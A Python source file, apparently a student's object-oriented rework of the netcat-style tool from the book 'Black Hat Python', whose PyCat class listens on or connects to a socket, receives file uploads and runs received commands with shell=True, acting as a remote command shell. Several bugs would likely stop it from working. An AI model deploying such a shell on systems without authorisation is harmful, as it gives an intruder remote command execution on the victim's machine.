# Tester BHP Tool to POO with Python
# Font: Book (Black Hat Python edition 2014)
"""
 Fonte base para evolucão do codigo veio do livro `Black Hat Python`
mais precisamente no primeiro capitulo
"""
import sys
import socket
import threading
import subprocess
import argparse
import logging


class PyCat:

    def __init__(self):
        self.listen = False  # bind, listen, acept (flag begin to server)
        self.command = False  # Handler
        self.execute = ""  # Handler
        self.upload_destination = str()  # Handler
        self.targer = ""  # Netting
        self.port = 0  # Netting
        self.upload = False  # non

        # Configuracao de logger
        self.logger = logging.getLogger('__name__')
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(levelame)s - %(message)s')
        file_handler = logging.FileHandler('../basic_network/py_catnet/pycat.log')
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)

    def run(self):
        if self.listen:
            self.server_loop()
        elif not self.listen and len(self.targer) and self.port > 0:
            self.client_sender()

    def client_sender(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            with client_socket:
                client_socket.connect((self.targer, self.port))

            if len(self.upload_destination):
                file_buffer = ""

                while True:
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    else:
                        file_buffer += data
                    with open(self.upload_destination, "wb") as filerr:
                        filerr.write(file_buffer.encode())
            if len(self.execute):
                output = self.run_command(self.execute)
                client_socket.send(output.decode())

            if self.command:
                while True:
                    client_socket.send("<NC:#>".encode())
                    cmd_buffer = ""

                    while '\n' not in cmd_buffer:
                        cmd_buffer += client_socket.recv(1024).decode()
                        response = self.run_command(cmd_buffer)
                        client_socket.send(response.encode())
        except Exception as err:
            print("Error # %s" % err)
            client_socket.close()

    def server_loop(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if not self.targer:
            self.targer = socket.gethostbyname('localhost')
        else:
            try:
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind((self.targer, self.port))
                server.listen(5)
                print(f"[*] - Listening on {self.targer}:{self.port}")

                while True:
                    client_socket, addr = server.accept()
                    self.logger.debug(f"[*] - Accepted connection from {addr[0]}:{int(addr[1])}")
                    client_thread = threading.Thread(target=self.client_handler, args=(client_socket,))
                    client_thread.start()

            except Exception as err:
                self.logger.error("Error <#:> {}".format(err))
                server.close()

    def client_handler(self, client_socket):

        if len(self.upload_destination):
            file_buffer = ""

            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                else:
                    file_buffer += data

                try:
                    with open(self.upload_destination, "wb") as filerr:
                        filerr.write(file_buffer)
                        client_socket.send('File sucefully create [*]')
                except:
                    client_socket.send("File failed to upload [!!]")

        if len(self.execute):
            output = self.run_command(self.execute)
            client_socket.send(output.encode())

        if self.command:
            while True:
                client_socket.send("<NC:#> ".encode())
                cmd_buffer = ""
                while '\n' not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024).decode()
                response = self.run_command(cmd_buffer)
                client_socket.send(response.decote())

    def run_command(self, command):
        command = command.rstrip()
        try:
            output = subprocess.check_call(command,
                                           stderr=subprocess.STDOUT,
                                           shell=True)
        except:
            output = "Failed to execute command.\r\n"
        return output.decode()


def arg_parser():
    parser = argparse.ArgumentParser(sys.argv[1:],
                                     description='NetCat with Python')
    parser.add_argument('-l', '--listen', action='store_true', help='TODO: ')
    parser.add_argument('-e', '--execute', metavar='FILE', help='TODO: ')
    parser.add_argument('-c', '--command', action='store_true', help='TODO: ')
    parser.add_argument('-u', '--upload', metavar='DESTINATION', help='TODO: ')
    parser.add_argument('-t', '--targer', metavar='HOST', help="TODO: ")
    parser.add_argument('-p', '--port', metavar='PORT', help='TODO: ')
    args = parser.parse_args()
    return args


if __name__ == '__main__':
    pycat = PyCat()
    args = arg_parser()

    pycat.targer = args.targer
    pycat.port = args.port
    pycat.upload_destination = args.upload
    pycat.command = args.command
    pycat.execute = args.execute
    pycat.listen = args.listen
    pycat.run()
